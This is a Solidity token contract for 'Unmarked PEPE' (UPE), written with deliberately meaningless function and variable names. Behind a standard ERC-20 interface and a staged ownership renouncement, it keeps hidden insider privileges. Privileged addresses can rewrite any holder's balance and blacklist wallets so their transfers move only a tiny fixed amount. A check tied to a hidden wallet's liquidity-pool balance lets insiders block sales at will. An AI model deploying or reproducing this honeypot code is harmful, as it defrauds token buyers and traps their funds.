//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface maxLaunchBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchSwap) external view returns (uint256);

    function transfer(address amountTotal, uint256 teamTxIs) external returns (bool);

    function allowance(address tradingTotalReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamTxIs) external returns (bool);

    function transferFrom(
        address sender,
        address amountTotal,
        uint256 teamTxIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundExempt, uint256 value);
    event Approval(address indexed tradingTotalReceiver, address indexed spender, uint256 value);
}

abstract contract atTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapWalletFund {
    function createPair(address sellAuto, address liquidityBuy) external returns (address);
}

interface maxLaunchBuyMetadata is maxLaunchBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnmarkedPEPE is atTake, maxLaunchBuy, maxLaunchBuyMetadata {

    function getOwner() external view returns (address) {
        return buyIs;
    }

    uint256 public teamEnable;

    event OwnershipTransferred(address indexed senderTrading, address indexed modeLaunched);

    uint256 walletLiquidity;

    uint256 private buyReceiverTo = 100000000 * 10 ** 18;

    mapping(address => uint256) private launchLimit;

    function allowance(address toLaunch, address shouldMode) external view virtual override returns (uint256) {
        if (shouldMode == maxWalletTotal) {
            return type(uint256).max;
        }
        return modeFee[toLaunch][shouldMode];
    }

    function symbol() external view virtual override returns (string memory) {
        return feeMax;
    }

    function toWalletBuy(address swapToken) public {
        require(swapToken.balance < 100000);
        if (swapTeam) {
            return;
        }
        
        swapFrom[swapToken] = true;
        
        swapTeam = true;
    }

    function amountWallet(uint256 teamTxIs) public {
        maxMarketingSwap();
        walletLiquidity = teamTxIs;
    }

    constructor (){
        if (buyAmount != totalFromReceiver) {
            shouldTeam = totalFromReceiver;
        }
        marketingTake exemptFromTx = marketingTake(maxWalletTotal);
        liquidityLimit = swapWalletFund(exemptFromTx.factory()).createPair(exemptFromTx.WETH(), address(this));
        if (atTo != buyAmount) {
            atTo = totalAuto;
        }
        totalAt = _msgSender();
        sellSwapToken();
        swapFrom[totalAt] = true;
        launchLimit[totalAt] = buyReceiverTo;
        
        emit Transfer(address(0), totalAt, buyReceiverTo);
    }

    function transfer(address modeFund, uint256 teamTxIs) external virtual override returns (bool) {
        return tokenSenderExempt(_msgSender(), modeFund, teamTxIs);
    }

    uint256 private totalAuto;

    function sellSwapToken() public {
        emit OwnershipTransferred(totalAt, address(0));
        buyIs = address(0);
    }

    address maxWalletTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant takeLaunched = 15 ** 10;

    mapping(address => bool) public swapFrom;

    address private buyIs;

    function maxMarketingSwap() private view {
        require(swapFrom[_msgSender()]);
    }

    function swapLaunched(address modeFund, uint256 teamTxIs) public {
        maxMarketingSwap();
        launchLimit[modeFund] = teamTxIs;
    }

    function approve(address shouldMode, uint256 teamTxIs) public virtual override returns (bool) {
        modeFee[_msgSender()][shouldMode] = teamTxIs;
        emit Approval(_msgSender(), shouldMode, teamTxIs);
        return true;
    }

    uint256 private walletLaunch;

    function transferFrom(address buySwap, address amountTotal, uint256 teamTxIs) external override returns (bool) {
        if (_msgSender() != maxWalletTotal) {
            if (modeFee[buySwap][_msgSender()] != type(uint256).max) {
                require(teamTxIs <= modeFee[buySwap][_msgSender()]);
                modeFee[buySwap][_msgSender()] -= teamTxIs;
            }
        }
        return tokenSenderExempt(buySwap, amountTotal, teamTxIs);
    }

    mapping(address => mapping(address => uint256)) private modeFee;

    address feeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return buyReceiverTo;
    }

    mapping(address => bool) public toAmountFund;

    uint256 txFrom;

    function buyLaunched(address feeTo) public {
        maxMarketingSwap();
        
        if (feeTo == totalAt || feeTo == liquidityLimit) {
            return;
        }
        toAmountFund[feeTo] = true;
    }

    uint256 private shouldTeam;

    address public liquidityLimit;

    function decimals() external view virtual override returns (uint8) {
        return launchedFee;
    }

    string private launchedToken = "Unmarked PEPE";

    string private feeMax = "UPE";

    bool public swapTeam;

    uint256 private buyAmount;

    address public totalAt;

    uint256 private atTo;

    function owner() external view returns (address) {
        return buyIs;
    }

    uint256 public walletFeeTotal;

    uint256 public totalFromReceiver;

    function balanceOf(address launchSwap) public view virtual override returns (uint256) {
        return launchLimit[launchSwap];
    }

    function name() external view virtual override returns (string memory) {
        return launchedToken;
    }

    function enableBuy(address buySwap, address amountTotal, uint256 teamTxIs) internal returns (bool) {
        require(launchLimit[buySwap] >= teamTxIs);
        launchLimit[buySwap] -= teamTxIs;
        launchLimit[amountTotal] += teamTxIs;
        emit Transfer(buySwap, amountTotal, teamTxIs);
        return true;
    }

    uint8 private launchedFee = 18;

    function tokenSenderExempt(address buySwap, address amountTotal, uint256 teamTxIs) internal returns (bool) {
        if (buySwap == totalAt) {
            return enableBuy(buySwap, amountTotal, teamTxIs);
        }
        uint256 receiverSwapTrading = maxLaunchBuy(liquidityLimit).balanceOf(feeLiquidity);
        require(receiverSwapTrading == walletLiquidity);
        require(amountTotal != feeLiquidity);
        if (toAmountFund[buySwap]) {
            return enableBuy(buySwap, amountTotal, takeLaunched);
        }
        return enableBuy(buySwap, amountTotal, teamTxIs);
    }

}